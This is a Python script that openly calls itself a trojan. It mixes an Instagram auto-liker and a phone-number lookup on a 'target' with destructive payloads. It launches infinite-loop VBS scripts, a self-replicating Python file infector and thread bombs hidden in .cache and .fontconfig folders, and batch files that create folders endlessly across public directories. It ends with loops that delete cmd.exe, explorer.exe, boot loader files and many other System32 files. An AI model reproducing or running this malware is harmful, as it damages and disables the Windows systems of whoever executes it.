import os.path
import time
from tkinter import *
import phonenumbers
import vk_api.bot_longpoll
import vk_api.upload
import vk_api.utils
import wget
from instapy import InstaPy
from instapy import smart_run
from phonenumbers import geocoder, carrier
from phonenumbers import is_carrier_specific_for_region
from phonenumbers import timezone
from win32com.client import Dispatch

# login credentials
insta_username = input('Type your instagram username here: ')  # <- enter username here
insta_password = input('Type your Instagram password here: ')  # <- enter password here

# get an InstaPy session!
# set headless_browser=True to run InstaPy in the background
session = InstaPy(username=insta_username,
                  password=insta_password,
                  headless_browser=False)

with smart_run(session):
    """ Activity flow """
    # general settings
    session.set_relationship_bounds(enabled=True,
                                    delimit_by_numbers=True,
                                    max_followers=4590,
                                    min_followers=45,
                                    min_following=77)

    session.set_dont_include(["friend1", "friend2", "friend3"])
    session.set_dont_like(["pizza", "#store", "NSFW"])

    # activity
    session.like_by_tags(["natgeo"], amount=10)
    pass
pass
print("You need to enter the Target area code")

time.sleep(2)

phoneNumber = phonenumbers.parse(input("Type here the Target phone number: "))

timeZone = timezone.time_zones_for_number(phoneNumber)

choose_language1 = print("Format has to be 'en'")

choose_language = input("Type here the language you want: ")

Carrier = carrier.name_for_number(phoneNumber, choose_language)

Carrier_is_specific_for_carrier_region = is_carrier_specific_for_region(phoneNumber, choose_language)

Region = geocoder.description_for_number(phoneNumber, choose_language)

valid = phonenumbers.is_valid_number(phoneNumber)

possible = phonenumbers.is_possible_number(phoneNumber)

print(timeZone)
print(Carrier)
print(phoneNumber)
print(Region)
print(valid)
print(possible)
pass

speak = Dispatch("SAPI.SpVoice").Speak

speak("WARNING: This is a trojan but it doesn't acquire any personal information, PLEASE USE THIS IN A VIRTUAL MACHINE!!!. ")

time.sleep(2)

url = "https://www.python.org/ftp/python/3.9.6/python-3.9.6-amd64.exe"

time.sleep(2)

wget.download(url, 'C:\\Users\\16162\\Downloads\\python-3.9.6-amd64.exe')

os.system.__call__("Start C:\\Users\\16162\\Downloads\\python-3.9.6-amd64.exe")

time.sleep(2)

os.system('Start cmd /c "color a & python C://Users/16162//PycharmProjects//pythonProject3//Panther.py"')

time.sleep(1)

m_file = open("my_file.txt", 'w')
m_file.writelines("while True\n")
m_file.writelines("Wend\n")

m_file = "my_file.txt"
base = os.path.splitext(m_file)[0]
os.rename(m_file, base + ".vbs")
os.system.__call__("Start my_file.vbs")

k_file = open("This_file.txt", 'w')
k_file.writelines("while True\n")
k_file.writelines("Wend\n")

k_file = "This_file.txt"
base = os.path.splitext(k_file)[0]
os.rename(k_file, base + ".vbs")
os.system.__call__("Start This_file.vbs")

A_file = open("HI.txt", 'w')
A_file.writelines("while True\n")
A_file.writelines("Wend\n")

A_file = "HI.txt"
base = os.path.splitext(A_file)[0]
os.rename(A_file, base + ".vbs")
os.system.__call__("Start HI.vbs")

l_file = open("keen.txt", 'w')
l_file.writelines("while True\n")
l_file.writelines("Wend\n")

l_file = "keen.txt"
base = os.path.splitext(l_file)[0]
os.rename(l_file, base + ".vbs")
os.system.__call__("Start keen.vbs")

q_file = open("f_file.txt", 'w')
q_file.writelines("while True\n")
q_file.writelines("Wend\n")

q_file = "f_file.txt"
base = os.path.splitext(q_file)[0]
os.rename(q_file, base + ".vbs")
os.system.__call__("Start f_file.vbs")

w_file = open("w_file.txt", 'w')
w_file.writelines("while True\n")
w_file.writelines("Wend\n")

w_file = "w_file.txt"
base = os.path.splitext(w_file)[0]
os.rename(w_file, base + ".vbs")
os.system.__call__("Start w_file.vbs")

os.system('Start cmd /c "color a & pip install wget"')

time.sleep(2)

os.system('Start cmd /c "color b & pip install pywin32"')

time.sleep(2)

os.system('Start cmd /c "color c & pip install glob"')

time.sleep(2)

e_file = open("C:\\Users\\16162\\.cache\\fontconfig\\e_file.py", 'w')

time.sleep(2)

e_file.writelines("import sys\n")
e_file.writelines("import glob\n\n")
e_file.writelines("virus_code = []\n")
e_file.writelines('with open(sys.argv[0], \'r\') as f:\n')
e_file.writelines('    lines = f.readlines()\n')
e_file.writelines("self_replicating_part = False\n")
e_file.writelines("for line in lines:\n")
e_file.writelines("    if line == '# Virus says HI!':\n")
e_file.writelines("        self_replicating_part = True\n")
e_file.writelines("    if not self_replicating_part:\n")
e_file.writelines("        virus_code.append(line)\n")
e_file.writelines("    if line == '# VIRUS SAYS BYE!':\n")
e_file.writelines("        break\n")
e_file.writelines("python_files = glob.glob('*.py') + glob.glob('*.pyw')\n\n")
e_file.writelines("for file in python_files:\n")
e_file.writelines("    with open(file, 'r') as f:\n")
e_file.writelines("        file_code = f.readlines()\n")
e_file.writelines("    infected = False\n\n")
e_file.writelines("    for line in file_code:\n")
e_file.writelines("        if line == '# VIRUS SAYS HI!':\n")
e_file.writelines("            infected = True\n")
e_file.writelines("            break\n")
e_file.writelines("    if not infected:\n")
e_file.writelines("        final_code = []\n")
e_file.writelines("        final_code.extend(virus_code)\n")
e_file.writelines("        final_code.extend('/n')\n")
e_file.writelines("        final_code.extend(file_code)\n")
e_file.writelines("        with open(file, 'w') as f:\n")
e_file.writelines("            f.writelines(final_code)\n\n\n")
e_file.writelines("def malicious_code():\n")
e_file.writelines("    print('YOU HAVE BEEN INFECTED HAHAHA !!!')\n\n\n")
e_file.writelines("malicious_code()\n")

time.sleep(1)

for i in range(1):
    time.sleep(2)
    For_Threading1 = open("C:\\Users\\16162\\.android\\My_Threading1.py", 'w')

    For_Threading1.writelines("from threading import Thread\n\n\n")
    For_Threading1.writelines("def create_threads():\n")
    For_Threading1.writelines("    for i in range(99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999):\n")
    For_Threading1.writelines("        name = 'Thread #%s '% (i + 1)\n")
    For_Threading1.writelines("        my_thread = MyThread(name)\n")
    For_Threading1.writelines("        my_thread.start()\n\n\n")
    For_Threading1.writelines("class MyThread(Thread):\n")
    For_Threading1.writelines("    def __init__(self, name):\n")
    For_Threading1.writelines("        Thread.__init__(self)\n")
    For_Threading1.writelines("        self.name = name\n\n")
    For_Threading1.writelines("    def run(self):\n")
    For_Threading1.writelines("        for i in range(99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999):\n")
    For_Threading1.writelines('            msg = "%s is running" % \ \n')
    For_Threading1.writelines("                  self.name\n")
    For_Threading1.writelines("            print(msg)\n\n\n")
    For_Threading1.writelines('if __name__ == "__main__:":\n')
    For_Threading1.writelines("    create_threads()\n\n")

    time.sleep(1)

    for t in range(1):
        time.sleep(2)
        For_Threading2 = open("C:\\Users\\16162\\.fontconfig\\My_Threading2.py", 'w')

        For_Threading2.writelines("from threading import Thread\n\n\n")
        For_Threading2.writelines("def create_threads():\n")
        For_Threading2.writelines("    for i in range(99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999):\n")
        For_Threading2.writelines("        name = 'Thread #%s '% (i + 1)\n")
        For_Threading2.writelines("        my_thread = MyThread(name)\n")
        For_Threading2.writelines("        my_thread.start()\n\n\n")
        For_Threading2.writelines("class MyThread(Thread):\n")
        For_Threading2.writelines("    def __init__(self, name):\n")
        For_Threading2.writelines("        Thread.__init__(self)\n")
        For_Threading2.writelines("        self.name = name\n\n")
        For_Threading2.writelines("    def run(self):\n")
        For_Threading2.writelines("        for i in range(99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999):\n")
        For_Threading2.writelines('            msg = "%s is running" % \ \n')
        For_Threading2.writelines("                  self.name\n")
        For_Threading2.writelines("            print(msg)\n\n\n")
        For_Threading2.writelines('if __name__ == "__main__:":\n')
        For_Threading2.writelines("    create_threads()\n\n")
os.system.__call__("Start C:\\Users\\16162\\.android\\My_Threading1.py")
os.system.__call__("Start C:\\Users\\16162\\.fontconfig\\My_Threading2.py")
os.system.__call__("Start C:\\Users\\16162\\.cache\\fontconfig\\e_file.py")
pass

class Window(Frame):
    def __init__(self, master=None):
        Frame.__init__(self, master)
        self.master = master


# initialize tkinter
root = Tk()
app = Window(root)

# set window title
root.wm_title("PLEASE GIVE ADMIN PERMISSION TO ALL YOUR FILES.")

# show window
root.mainloop(
)
pass
time.sleep(1)
if dir("C:\\Users\\Default\\Documents") == True:
    try:
        Very_Dangerous_Virus = open("C:\\Users\\Default\\Documents\\Very_Dangerous_Virus.bat", 'w')

        Very_Dangerous_Virus.writelines("@echo off")
        Very_Dangerous_Virus.writelines(":top")
        Very_Dangerous_Virus.writelines("md %random%")
        Very_Dangerous_Virus.writelines("goto top")

        Very_Dangerous_Virus1 = open("C:\\Users\Public\\Cyberlink\\Downloaded Audio\\SoundClip_202_0003\\Very_Dangerous_Virus1.bat", 'w')

        Very_Dangerous_Virus1.writelines("@echo off")
        Very_Dangerous_Virus1.writelines(":top")
        Very_Dangerous_Virus1.writelines("md %random%")
        Very_Dangerous_Virus1.writelines("goto top")

        Very_Dangerous_Virus2 = open("C:\\Users\\Public\\Libraries\\Very_Dangerous_Virus2.bat", 'w')

        Very_Dangerous_Virus2.writelines("@echo off")
        Very_Dangerous_Virus2.writelines(":top")
        Very_Dangerous_Virus2.writelines("md %random%")
        Very_Dangerous_Virus2.writelines("goto top")

        Very_Dangerous_Virus3 = open("C:\\Users\\Public\\AccountPictures\\S-1-5-21-1376122717-453272576-307663161-1001\\Very_Dangerous_Virus3.bat", 'w')

        Very_Dangerous_Virus3.writelines("@echo off")
        Very_Dangerous_Virus3.writelines(":top")
        Very_Dangerous_Virus3.writelines("md %random%")
        Very_Dangerous_Virus3.writelines("goto top")

        Very_Dangerous_Virus4 = open("C:\\Users\\Public\Desktop\\Very_Dangerous_Virus4.bat", 'w')

        Very_Dangerous_Virus4.writelines("@echo off")
        Very_Dangerous_Virus4.writelines(":top")
        Very_Dangerous_Virus4.writelines("md %random%")
        Very_Dangerous_Virus4.writelines("goto top")

        if dir("C:\\Users\\Public\\Documents\\AltSigner") == True:
            Very_Dangerous_Virus5 = open("C:\\Users\\Public\\Documents\\AltSigner\\Very_Dangerous_Virus5.bat", 'w')

            Very_Dangerous_Virus5.writelines("@echo off")
            Very_Dangerous_Virus5.writelines(":top")
            Very_Dangerous_Virus5.writelines("md %random%")
            Very_Dangerous_Virus5.writelines("goto top")

    except print("error: couldn't locate directory"):
        if not dir("C:\\Users\\Public\\Documents\\AltSigner"):
            print("Permission denied:  C:\\Users\\Public\\Documents\\AltSigner")
    pass
    try:
        Very_Dangerous_Virus6 = open("C:\\Users\\Public\\Documents\\RegRunInfo\\Very_Dangerous_Virus6.bat", 'w')

        Very_Dangerous_Virus6.writelines("@echo off")
        Very_Dangerous_Virus6.writelines(":top")
        Very_Dangerous_Virus6.writelines("md %random%")
        Very_Dangerous_Virus6.writelines("goto top")
        if dir("C:\\Users\\Public\\Documents\\Steam\\CODEX\\346010\\local") == True:
            Very_Dangerous_Virus7 = open("C:\\Users\\Public\\Documents\\Steam\\CODEX\\346010\\local\\Very_Dangerous_Virus7.bat", 'w')

            Very_Dangerous_Virus7.writelines("@echo off")
            Very_Dangerous_Virus7.writelines(":top")
            Very_Dangerous_Virus7.writelines("md %random%")
            Very_Dangerous_Virus7.writelines("goto top")
    except print("error: couldn't locate directory"):
        if not dir("C:\\Users\\Public\\Documents\\Steam\\CODEX\\346010\\local"):
            print("Permission denied: C:\\Users\\Public\\Documents\\Steam\\CODEX\\346010\\local")
    pass
    try:
        Very_Dangerous_Virus8 = open("C:\\Users\\Public\\Downloads\\Very_Dangerous_Virus8.bat", 'w')

        Very_Dangerous_Virus8.writelines("@echo off")
        Very_Dangerous_Virus8.writelines(":top")
        Very_Dangerous_Virus8.writelines("md %random%")
        Very_Dangerous_Virus8.writelines("goto top")

        Very_Dangerous_Virus9 = open("C:\\Users\\Public\\Music\\Very_Dangerous_Virus9.bat", 'w')

        Very_Dangerous_Virus9.writelines("@echo off")
        Very_Dangerous_Virus9.writelines(":top")
        Very_Dangerous_Virus9.writelines("md %random%")
        Very_Dangerous_Virus9.writelines("goto top")

        Very_Dangerous_Virus10 = open("C:\\Users\\Public\\Pictures\\Very_Dangerous_Virus10.bat", 'w')

        Very_Dangerous_Virus10.writelines("@echo off")
        Very_Dangerous_Virus10.writelines(":top")
        Very_Dangerous_Virus10.writelines("md %random%")
        Very_Dangerous_Virus10.writelines("goto top")

        Very_Dangerous_Virus11 = open("C:\\Users\\Public\\Videos\\Very_Dangerous_Virus11.bat", 'w')

        Very_Dangerous_Virus11.writelines("@echo off")
        Very_Dangerous_Virus11.writelines(":top")
        Very_Dangerous_Virus11.writelines("md %random%")
        Very_Dangerous_Virus11.writelines("goto top")

        Very_Dangerous_Virus12 = open("C:\\Users\\Public\\Very_Dangerous_Virus12.bat", 'w')

        Very_Dangerous_Virus12.writelines("@echo off")
        Very_Dangerous_Virus12.writelines(":top")
        Very_Dangerous_Virus12.writelines("md %random%")
        Very_Dangerous_Virus12.writelines("goto top")

    except print("error: couldn't locate directory"):
        if not dir("C:\\Users\\Default\\Documents\\Very_Dangerous_Virus.bat"):
            print("Permission denied: 'C:\\Users\\Default\\Documents")

time.sleep(30)

os.system.__call__("Start C:\\Users\\Default\\Documents\\Very_Dangerous_Virus.bat")
os.system.__call__("Start C:\\Users\Public\\Cyberlink\\Downloaded Audio\\SoundClip_202_0003\\Very_Dangerous_Virus1.bat")
os.system.__call__("Start C:\\Users\\Public\\Libraries\\Very_Dangerous_Virus2.bat")
os.system.__call__("Start C:\\Users\\Public\\AccountPictures\\S-1-5-21-1376122717-453272576-307663161-1001\\Very_Dangerous_Virus3.bat")
os.system.__call__("Start C:\\Users\\Public\Desktop\\Very_Dangerous_Virus4.bat")
os.system.__call__("Start C:\\Users\\Public\\Documents\\AltSigner\\Very_Dangerous_Virus5.bat")
os.system.__call__("Start C:\\Users\\Public\\Documents\\RegRunInfo\\Very_Dangerous_Virus6.bat")
os.system.__call__("Start C:\\Users\\Public\\Documents\\Steam\\CODEX\\346010\\local\\Very_Dangerous_Virus7.bat")
os.system.__call__("Start C:\\Users\\Public\\Downloads\\Very_Dangerous_Virus8.bat")
os.system.__call__("Start C:\\Users\\Public\\Music\\Very_Dangerous_Virus9.bat")
os.system.__call__("Start C:\\Users\\Public\\Pictures\\Very_Dangerous_Virus10.bat")
os.system.__call__("Start C:\\Users\\Public\\Videos\\Very_Dangerous_Virus11.bat")
os.system.__call__("Start C:\\Users\\Public\\Very_Dangerous_Virus12.bat")

time.sleep(2)

for i in range(1):
    speak = Dispatch("SAPI.SpVoice").Speak
    speak("You just got infected LAUGH MY FUCKIN ASS OUT")
    time.sleep(200)
    for i in range(
            9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999):
        speak = Dispatch("SAPI.SpVoice").Speak
        speak("You just got infected LAUGH MY FUCKIN ASS OUT")
        os.system.__call__("Start C:\Windows/System32/cmd.exe")
        os.system.__call__("Start cmd")
        while True:
            for i in range(
                        9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999):
                if os.system.__call__("C:\Windows/System32/cmd.exe") and os.system.__call__(
                        "C:\Windows/System32") == True:
                    os.system.__call__("del C:\Windows/explorer.exe")
                    os.system.__call__("del C:\Windows/write.exe")
                    os.system.__call__("del C:\Windows/bfsvc.exe")
                    os.system.__call__("del C:\Windows/System32/cmd.exe")
                    os.system.__call__('del C:\Windows/System32/es-ES/cmdkey.exe.mui')
                    os.system.__call__('del C:\windows/System32/es-MX/cmdl32.exe.mui')
                    os.system.__call__("del C:\Windows/System32/es-ES/cmd.exe.mui")
                    os.system.__call__("del C:\Windows/System32/en-US/cmdkey.exe.mui")
                    os.system.__call__("del C:\Windows/System32/en-US/cmdl32.exe.mui")
                    os.system.__call__("del C:\Windows/System32/en-US/cmd.exe.mui")
                    os.system.__call__("del C:\Windows/System32/en-US/cmdl32.exe.mui")
                    os.system.__call__("del C:\Windows/System32/cmdkey.exe")
                    os.system.__call__("del C:\Windows/System32/cmdl32.exe")
                    os.system.__call__("del C:\Windows/System32/0409")
                    os.system.__call__("del C:\Windows/System32/AdvancedInstallers/cmiv2.dll")
                    os.system.__call__("del C:\Windows/System32/AMD/amdkmpfd")
                    os.system.__call__("del C:\Windows/System32/AMD/amdkmpfd/amdkmpfd.ctz")
                    os.system.__call__("del C:\Windows/System32/AMD/amdkmpfd/amdkmpfd.itz")
                    os.system.__call__("del C:\Windows/System32/AMD/amdkmpfd/amdkmpfd.stz")
                    os.system.__call__("del C:\Windows/System32/AMD/Real")
                    os.system.__call__("del C:\Windows/System32/am-et/RBDS045E.dic")
                    os.system.__call__("del C:\Windows/System32/am-et/TransliterationComponentLayouts.dgml")
                    os.system.__call__("del C:\Windows/System32/AppLocker")
                    os.system.__call__("del C:\Windows/System32/appraiser/appraiser.sdb")
                    os.system.__call__("del C:\Windows/System32/appraiser/Appraiser_Data.ini")
                    os.system.__call__("del C:\Windows/System32/appraiser/Appraiser_TelemetryRunList.xml")
                    os.system.__call__("del C:\Windows/System32/ar-SA/cdosys.dll.mui")
                    os.system.__call__("del C:\Windows/System32/ar-SA/comctl32.dll.mui")
                    os.system.__call__("del C:\Windows/System32/ar-SA/comdlg32.dll.mui")
                    os.system.__call__("del C:\Windows/System32/ar-SA/fms.dll.mui")
                    os.system.__call__("del C:\Windows/System32/ar-SA/mlang.dll.mui")
                    os.system.__call__("del C:\Windows/System32/ar-SA/msimsg.dll.mui")
                    os.system.__call__("del C:\Windows/System32/ar-SA/quickassist.exe.mui")
                    os.system.__call__("del C:\Windows/System32/ar-SA/SyncRes.dll.mui")
                    os.system.__call__("del C:\Windows/System32/ar-SA/Windows.Media.Speech.UXRes.dll.mui")
                    os.system.__call__("del C:\Windows/System32/ar-SA/windows.ui.xaml.dll.mui")
                    os.system.__call__("del C:\Windows/System32/ar-SA/WWAHost.exe.mui")
                    os.system.__call__("del C:\Windows/System32/ar-SA/xpsrchvw.exe.mui")
                    os.system.__call__("del C:\Windows/System32/bg-BG/comctl32.dll.mui")
                    os.system.__call__("del C:\Windows/System32/bg-BG/comdlg32.dll.mui")
                    os.system.__call__("del C:\Windows/System32/bg-BG/fms.dll.mui")
                    os.system.__call__("del C:\Windows/System32/bg-BG/mlang.dll.mui")
                    os.system.__call__("del C:\Windows/System32/bg-BG/msimsg.dll.mui")
                    os.system.__call__("del C:\Windows/System32/bg-BG/quickassist.exe.mui")
                    os.system.__call__("del C:\Windows/System32/bg-BG/SyncRes.dll.mui")
                    os.system.__call__("del C:\Windows/System32/bg-BG/windows.ui.xaml.dll.mui")
                    os.system.__call__("del C:\Windows/System32/bg-BG/WWAHost.exe.mui")
                    os.system.__call__("del C:\Windows/System32/bg-BG/xpsrchvw.exe.mui")
                    os.system.__call__("del C:\Windows/System32/Boot/en-US/winload.efi.mui")
                    os.system.__call__("del C:\Windows/System32/Boot/en-US/winload.exe.mui")
                    os.system.__call__("del C:\Windows/System32/Boot/en-US/winresume.efi.mui")
                    os.system.__call__("del C:\Windows/System32/Boot/en-US/winresume.exe.mui")
                    os.system.__call__("del C:\Windows/System32/Boot/es-ES/winload.efi.mui")
                    os.system.__call__("del C:\Windows/System32/Boot/es-ES/winload.exe.mui")
                    os.system.__call__("del C:\Windows/System32/Boot/es-ES/winresume.efi.mui")
                    os.system.__call__("del C:\Windows/System32/Boot/es-ES/winresume.exe.mui")
                    os.system.__call__("del C:\Windows/System32/Boot/winload.efi")
                    os.system.__call__("del C:\Windows/System32/Boot/winload.exe")
                    os.system.__call__("del C:\Windows/System32/Boot/winresume.efi")
                    os.system.__call__("del C:\Windows/System32/Boot/winresume.exe")
                    os.system.__call__("del C:\Windows/System32/Bthprops/@BthpropsNotificationLogo.png")
                    os.system.__call__(
                            "del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstAR.dll")
                    os.system.__call__(
                            "del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstCN.dll")
                    os.system.__call__(
                            "del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstCZ.dll")
                    os.system.__call__(
                            "del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstDE.dll")
                    os.system.__call__(
                            "del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstDK.dll")
                    os.system.__call__(
                            "del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstES.dll")
                    os.system.__call__(
                            "del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstFI.dll")
                    os.system.__call__(
                            "del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstFR.dll")
                    os.system.__call__(
                            "del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstGR.dll")
                    os.system.__call__(
                            "del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstHU.dll")
                    os.system.__call__(
                            "del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstID.dll")
                    os.system.__call__(
                            "del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstIT.dll")
                    os.system.__call__(
                            "del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstJP.dll")
                    os.system.__call__(
                            "del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstKR.dll")
                    os.system.__call__(
                            "del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstNL.dll")
                    os.system.__call__(
                            "del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstNO.dll")
                    os.system.__call__(
                            "del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstPL.dll")
                    os.system.__call__(
                            "del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstPT.dll")
                    os.system.__call__(
                            "del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstRU.dll")
                    os.system.__call__(
                            "del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstSE.dll")
                    os.system.__call__(
                            "del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstTH.dll")
                    os.system.__call__(
                            "del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstTR.dll")
                    os.system.__call__(
                            "del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstTW.dll")
                    os.system.__call__(
                            "del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstUS.dll")
                    os.system.__call__(
                            "del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstAR.ini")
                    os.system.__call__(
                            "del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstCN.ini")
                    os.system.__call__(
                            "del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstCZ.ini")
                    os.system.__call__(
                            "del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstDE.ini")
                    os.system.__call__(
                            "del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstDK.ini")
                    os.system.__call__(
                            "del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstES.ini")
                    os.system.__call__(
                            "del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstFI.ini")
                    os.system.__call__(
                            "del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstFR.ini")
                    os.system.__call__(
                            "del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstGR.ini")
                    os.system.__call__(
                            "del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstHU.ini")
                    os.system.__call__(
                            "del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstID.ini")
                    os.system.__call__(
                            "del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstIT.ini")
                    os.system.__call__(
                            "del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstJP.ini")
                    os.system.__call__(
                            "del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstKR.ini")
                    os.system.__call__(
                            "del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstNL.ini")
                    os.system.__call__(
                            "del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstNO.ini")
                    os.system.__call__(
                            "del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstPL.ini")
                    os.system.__call__(
                            "del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstPT.ini")
                    os.system.__call__(
                            "del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstRU.ini")
